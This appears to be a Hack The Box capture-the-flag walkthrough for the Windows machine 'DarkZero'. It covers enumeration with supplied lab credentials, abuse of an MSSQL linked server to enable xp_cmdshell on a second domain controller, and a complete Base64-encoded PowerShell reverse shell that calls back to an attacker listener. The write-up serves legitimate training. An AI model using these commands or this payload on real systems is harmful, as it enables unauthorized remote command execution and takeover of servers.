---
title: "Hack The Box: DarkZero Walkthrough"
date: 2026-03-30
categories: ["HackTheBox", "Active Directory", "Windows"]
tags: ["walkthrough", "windows", "active directory", "mssql", "linked-server"]
image:
  path: /assets/darkzero/cover.png
---

## Machine Overview

* **Machine Name:** DarkZero
* **Difficulty:** Hard
* **Operating System:** Windows

This is a write-up for the Hack The Box machine **DarkZero**. The machine simulates a realistic enterprise Active Directory environment featuring a dual-domain controller setup and an exposed MSSQL instance. The attack chain demonstrates how a low-privileged domain account can be leveraged to abuse SQL linked server trust relationships for lateral movement and remote code execution.

The machine demonstrates several modern enterprise attack techniques including:

- SMB and LDAP enumeration
- MSSQL enumeration and linked server abuse
- Enabling `xp_cmdshell` for remote command execution
- PowerShell reverse shell delivery via MSSQL

Before beginning, the hostname was added to the local hosts file:

```shell
10.129.16.212 darkzero.htb dc01.darkzero.htb
```

---

# Enumeration

## Nmap Scan

Initial reconnaissance was performed to identify running services.

```shell
nmap -sCV -A 10.129.16.212
```

### Open Ports

```shell
53/tcp    DNS
88/tcp    Kerberos
135/tcp   MSRPC
139/tcp   NetBIOS-SSN
389/tcp   LDAP
445/tcp   Microsoft-DS
464/tcp   Kpasswd5
593/tcp   HTTP-RPC-EPMAP
636/tcp   LDAPSSL
2179/tcp  VMRDP
3268/tcp  GlobalCatalog LDAP
3269/tcp  GlobalCatalog LDAPS
5985/tcp  WinRM (HTTP)
```

The presence of **Kerberos, LDAP, SMB, and DNS** strongly indicates that the target is a **Windows Active Directory Domain Controller**.

---

# SMB Enumeration

Credentials obtained at the start of the engagement were validated against the SMB service.

```shell
crackmapexec smb 10.129.16.212 -u 'john.w' -p 'RFulUtONCOL!'
```


Authentication succeeded, confirming the account `darkzero\john.w` is valid.

Share enumeration was performed next:

```shell
nxc smb 10.129.16.212 -u 'john.w' -p 'RFulUtONCOL!' --shares
```
![Desktop View](/assets/darkzero/2.png){: width="700" height="400" .normal }

No accessible non-default shares were found.

---

# Discovering a Second Domain Controller

LDAP was queried to check for additional domain controllers in the environment.

```shell
nxc ldap 10.129.16.212 -u 'john.w' -p 'RFulUtONCOL!' --dc-list
```
![Desktop View](/assets/darkzero/3.png){: width="700" height="400" .normal }

A second domain controller was discovered:

```shell
DC02.darkzero.ext
```

This is significant — it suggests a **multi-DC environment** with potential trust relationships to enumerate.

---

# MSSQL Enumeration

The target was probed for a running MSSQL service.

```shell
nxc mssql 10.129.16.212 -u 'john.w' -p 'RFulUtONCOL!'
```

```shell
[+] darkzero.htb\john.w:RFulUtONCOL!
```

Authentication succeeded. Database enumeration was performed next.

### Listing Databases

```sql
SELECT name FROM sys.databases
```
![Desktop View](/assets/darkzero/4.png){: width="700" height="400" .normal }

```shell
master
tempdb
model
msdb
```

### Listing Server Principals

```sql
SELECT name FROM master.sys.server_principals
```

```shell
sa
public
sysadmin
securityadmin
serveradmin
setupadmin
processadmin
diskadmin
dbcreator
bulkadmin
darkzero\john.w
darkzero\Domain Users
```

---

# MSSQL Linked Server Abuse

## Discovering the Link

Linked server enumeration was performed using the built-in `enum_links` command.

```shell
enum_links
```
![Desktop View](/assets/darkzero/5.png){: width="700" height="400" .normal }

A trust relationship to DC02 was discovered:

```shell
Linked Server          Local Login        Is Self Mapping    Remote Login
--------------------   ---------------    ---------------    ------------
DC02.darkzero.ext      darkzero\john.w    0                  dc01_sql_svc
```

### Understanding the Mapping

| Field | Value | Meaning |
|---|---|---|
| Linked Server | `DC02.darkzero.ext` | The remote SQL Server |
| Local Login | `darkzero\john.w` | The current authenticated user |
| Is Self Mapping | `0` (False) | Credentials are **not** passed through |
| Remote Login | `dc01_sql_svc` | The account used on DC02 |

Because `Is Self Mapping = 0`, SQL Server maps the current user (`john.w`) to a **different account** (`dc01_sql_svc`) when connecting to DC02. This means any commands executed over the link run in the context of `dc01_sql_svc` on DC02.

### Attack Flow

```shell
1. enum_links                         # Discover the linked server
2. use_link [DC02.darkzero.ext]       # Switch context to the linked server
3. Enable xp_cmdshell                 # Unlock OS command execution
4. Execute commands via xp_cmdshell   # Run arbitrary system commands
```

---

# Remote Code Execution via xp_cmdshell

## Enabling xp_cmdshell

After pivoting to the linked server context, `xp_cmdshell` was enabled:

```sql
-- Step 1: Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Step 2: Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Step 3: Verify
EXEC sp_configure 'xp_cmdshell';
-- Expect: run_value = 1
```

## Confirming Execution Context

```sql
EXEC xp_cmdshell 'whoami';
```

```shell
output
--------------------
darkzero-ext\svc_sql
NULL
```

Commands are now executing as `darkzero-ext\svc_sql` on **DC02** — a privileged service account on the external domain controller.

---

# Reverse Shell

## Establishing a Listener

A Netcat listener was started on the attacker machine:

```shell
nc -lvnp 4444
```

## Generating the PowerShell Payload

A PowerShell TCP reverse shell was encoded in Base64 to avoid argument parsing issues:

```bash
echo -n '$client = New-Object System.Net.Sockets.TCPClient("<YOUR_IP>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' \
| iconv -t UTF-16LE | base64 -w 0
```

## Executing the Payload via MSSQL

```sql
EXEC xp_cmdshell 'powershell -e <PASTE_BASE64_HERE>';
```

A shell was received on the listener:
![Desktop View](/assets/darkzero/6.png){: width="700" height="400" .normal }


```shell
nc -lvnp 4444
listening on [any] 4444
connect to [10.10.17.73] from (UNKNOWN) [10.129.16.212] 53092
whoami
darkzero-ext\svc_sql
PS C:\Windows\system32>
```

Full interactive access to DC02 was achieved as `darkzero-ext\svc_sql`.

---

# Conclusion

DarkZero is an excellent **hard-difficulty Active Directory machine** that demonstrates how a trusted SQL linked server relationship can be abused to pivot between domain controllers without any direct authentication against the target host.

The attack chain included:

- SMB and LDAP enumeration with valid domain credentials
- MSSQL service discovery and authentication
- Linked server enumeration and trust mapping analysis
- `xp_cmdshell` activation over a linked server context
- PowerShell reverse shell delivery for interactive system access

This machine is a great exercise in **multi-DC environment enumeration and MSSQL lateral movement**, showcasing how database trust relationships can become a critical pivot point in an enterprise compromise.

## Happy Hacking 👾